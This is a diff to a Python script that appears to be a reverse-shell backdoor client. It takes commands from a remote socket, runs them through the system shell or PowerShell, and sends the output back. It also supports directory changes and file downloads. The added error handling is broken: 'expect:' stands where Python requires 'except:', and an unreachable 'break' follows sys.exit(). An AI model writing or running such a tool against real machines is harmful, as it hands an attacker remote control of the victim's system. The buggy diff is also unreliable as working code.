@@ -14,17 +14,21 @@ def download(s,data):
           
           
 def cmd(s,data):
-     if data[:2].decode("utf-8")=="cd":
-          cd(s,data)
-     elif data[:8].decode("utf-8")=="download":
-          download(s,data)
-     else:
-          cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-          output=cmd.stdout.read()+cmd.stderr.read()
-          output=str(output,"utf-8")
-          string3=str.encode(output+os.getcwd()+'>',"utf-8")
-          s.sendall(string3)
-
+     try:
+         if data[:2].decode("utf-8")=="cd":
+              cd(s,data)
+         elif data[:8].decode("utf-8")=="download":
+              download(s,data)
+         else:
+              cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+              output=cmd.stdout.read()+cmd.stderr.read()
+              output=str(output,"utf-8")
+              string3=str.encode(output+os.getcwd()+'>',"utf-8")
+              s.sendall(string3)
+     expect:
+         print("An Erorr is Occured")
+         s.close()
+         sys.exit()
 
 def cd(s,data):
      os.chdir(data[3:].decode("utf-8"))
@@ -32,15 +36,20 @@ def cd(s,data):
                 
                 
 def powershell(s,data):
-     if data[:2].decode("utf-8")=="cd":
-          cd(s,data)
-     elif data[:8].decode("utf-8")=="download":
-          download(s,data)
-     else:
-          p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
-          output=p.stdout.read()+p.stderr.read()
-          string3=str.encode(output+os.getcwd()+'>',"utf-8")
-          s.sendall(string3)
+     try:
+         if data[:2].decode("utf-8")=="cd":
+               cd(s,data)
+         elif data[:8].decode("utf-8")=="download":
+               download(s,data)
+         else:
+               p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
+               output=p.stdout.read()+p.stderr.read()
+               string3=str.encode(output+os.getcwd()+'>',"utf-8")
+               s.sendall(string3)
+     expect:
+          print("An Error is occured")
+          s.close()
+          sys.exit()
 
 
 def connect():
@@ -65,8 +74,9 @@ def main():
                     powershell(s,data)   
                else:
                     sys.exit("WRONG CHOICE")    
-        except KeyboardInterrupt:
+        except :
           s.close()
+          sys.exit()
           break
      s.close()
      
